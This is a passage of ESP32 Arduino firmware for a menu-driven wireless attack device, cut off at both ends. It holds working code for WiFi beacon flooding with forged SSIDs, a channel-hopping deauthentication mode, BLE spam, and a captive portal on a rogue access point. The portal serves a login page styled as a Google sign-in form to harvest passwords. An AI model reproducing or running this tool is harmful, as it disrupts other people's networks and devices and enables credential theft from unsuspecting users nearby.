    strncpy(reinterpret_cast<char *>(packet + 38), ssids[randomIndex], 32);
    packet[38 + 32] = '\0';  // Ensure null-termination

    packet[56] = channel;

    esp_wifi_80211_tx(WIFI_IF_STA, packet, 57, false);
    esp_wifi_80211_tx(WIFI_IF_STA, packet, 57, false);
    esp_wifi_80211_tx(WIFI_IF_STA, packet, 57, false);
    delay(1);
  }

  if (digitalRead(BACK_PIN) == LOW && inSubMenu) {
    while (digitalRead(BACK_PIN) == LOW)
      ;
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print(" BeaconStopped! ");
    lcd.setCursor(0, 1);
    lcd.print("  Back to Menu  ");
    delay(1500);
    inSubMenu = false;
    displayMenu();
  }
}
void scanNetworks() {
  Serial.println("Scanning networks...");
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(" Networks SSID  ");
  lcd.setCursor(0, 1);
  lcd.print(" Scanning.....  ");
  int numSsid = WiFi.scanNetworks();
  Serial.println("Scan complete");
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("  SSIDs Found!  ");
  lcd.setCursor(0, 1);
  lcd.print(" Getting Ready  ");
  delay(1500);

  // Limit to 50 SSIDs for simplicity
  numSsids = min(numSsid, 50);

  for (int i = 0; i < numSsids; ++i) {
    strncpy(ssids[i], WiFi.SSID(i).c_str(), sizeof(ssids[i]) - 1);
    ssids[i][sizeof(ssids[i]) - 1] = '\0';  // Ensure null-termination
    Serial.println(ssids[i]);
  }
}
void generateShuffledSsids() {
  // Initialize base SSIDs
  for (int i = 0; i < 5; ++i) {
    strncpy(ssids[i], baseSsid[i], sizeof(ssids[i]) - 1);
    ssids[i][sizeof(ssids[i]) - 1] = '\0';  // Ensure null-termination
    shuffleSsid(ssids[i]);
  }

  // Generate (50 - 5) more shuffled SSIDs
  for (int i = 5; i < 50; ++i) {
    int randomIndex = random(5);
    strncpy(ssids[i], baseSsid[randomIndex], sizeof(ssids[i]) - 1);
    ssids[i][sizeof(ssids[i]) - 1] = '\0';  // Ensure null-termination
    shuffleSsid(ssids[i]);
  }
}
void shuffleSsid(char *ssid) {
  int length = strlen(ssid);
  for (int i = length - 1; i > 0; --i) {
    int j = random(0, i + 1);
    char temp = ssid[i];
    ssid[i] = ssid[j];
    ssid[j] = temp;
  }
}

// DEAUTH WIFI SSID //
void executeSubMenuDeauth() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("  Deauth SSIDs  ");
  lcd.setCursor(0, 1);
  lcd.print("SendingPackets..");
  int curr_channel = 1;
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

  deauth_type = DEAUTH_TYPE_ALL;
  Serial.println("Starting Deauth...");

  if (deauth_type == DEAUTH_TYPE_ALL) {
    while (digitalRead(BACK_PIN) == HIGH) {
      if (curr_channel > CHANNEL_MAX) curr_channel = 1;
      esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
      curr_channel++;
      delay(10);
      if (digitalRead(BACK_PIN) == LOW) {
        while (digitalRead(BACK_PIN) == LOW)
          ;
        stop_deauth();
        lcd.clear();
        lcd.setCursor(0, 0);
        lcd.print(" DeauthStopped ");
        lcd.setCursor(0, 1);
        lcd.print(" Back to Menu  ");
        delay(2000);
        displayMenu();
        inSubMenu = false;
        break;
      }
    }
  }
}

// BLE Spamming //
void executeSubMenuBLE() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("  BLE Beacon    ");
  lcd.setCursor(0, 1);
  lcd.print("SpamInitiated...");
  digitalWrite(RELAY_PIN, HIGH);

  loopInBLE();
}
void loopInBLE() {
  while (digitalRead(BACK_PIN) == HIGH) {
    if (digitalRead(BACK_PIN) == LOW) {
      while (digitalRead(BACK_PIN) == LOW)
        ;
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("  BLE Stopped  ");
      lcd.setCursor(0, 1);
      lcd.print(" Back to Menu  ");
      digitalWrite(RELAY_PIN, LOW);
      delay(2000);
      displayMenu();
      inSubMenu = false;
      break;
    }
    delay(50);
  }
  if (digitalRead(BACK_PIN) == LOW) {
    while (digitalRead(BACK_PIN) == LOW)
      ;
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("  BLE Stopped  ");
    lcd.setCursor(0, 1);
    lcd.print(" Back to Menu  ");
    digitalWrite(RELAY_PIN, LOW);
    delay(2000);
    displayMenu();
    inSubMenu = false;
  }
}

// CPortal WiFi //
void executeSubMenuCPortal() {
  inSubMenu = true;
  WiFi.mode(WIFI_AP);
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(" Captive Portal ");
  lcd.setCursor(0, 1);
  lcd.print("  Initiating... ");
  delay(1000);

  responseHTML = "<!DOCTYPE html><style> @import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');  body { margin: 0; padding: 0; background-size: cover; font-family: 'Open Sans', sans-serif;} .box { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 25rem; padding: 3.5rem; box-sizing: border-box; border: 1px solid #dadce0; -webkit-border-radius: 8px; border-radius: 8px;  } .box h2 { margin: 0px 0 -0.125rem; padding: 0; text-align: center; color: #202124; font-size: 24px; font-weight: 400;} .box .logo { display: flex; flex-direction: row; justify-content: center; margin-bottom: 16px;  } .box p { font-size: 16px; font-weight: 400; letter-spacing: 1px; line-height: 1.5; margin-bottom: 24px; text-align: center;} .box .inputBox { position: relative;} .box .inputBox input { width: 93%; padding: 1.3rem 10px; font-size: 1rem;letter-spacing: 0.062rem;margin-bottom: 1.875rem;border: 1px solid #ccc;background: transparent;border-radius: 4px;} .box .inputBox label { position: absolute; top: 0; left: 10px; padding: 0.625rem 0; font-size: 1rem; color: gray; pointer-events: none; transition: 0.5s;} .box .inputBox input:focus ~ label,.box .inputBox input:valid ~ label,.box .inputBox input:not([value=\"\"]) ~ label { top: -1.125rem; left: 10px; color: #1a73e8; font-size: 0.75rem; background-color: #fff; height: 10px; padding-left: 5px; padding-right: 5px;} .box .inputBox input:focus { outline: none; border: 2px solid #1a73e8;} .box input[type=\"submit\"] { border: none; outline: none; color: #fff; background-color: #1a73e8; padding: 0.625rem 1.25rem; cursor: pointer; border-radius: 0.312rem; font-size: 1rem; float: right;  }  .box input[type=\"submit\"]:hover { background-color: #287ae6; box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);  }</style><html lang=\"en\"><head> <meta charset=\"UTF-8\"> <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> <title>Google Form</title> <link rel=\"stylesheet\" href=\"google.css\"></head><body>  <div class=\"box\">  <div class=\"logo\"><img src=\"data:image/png;base64,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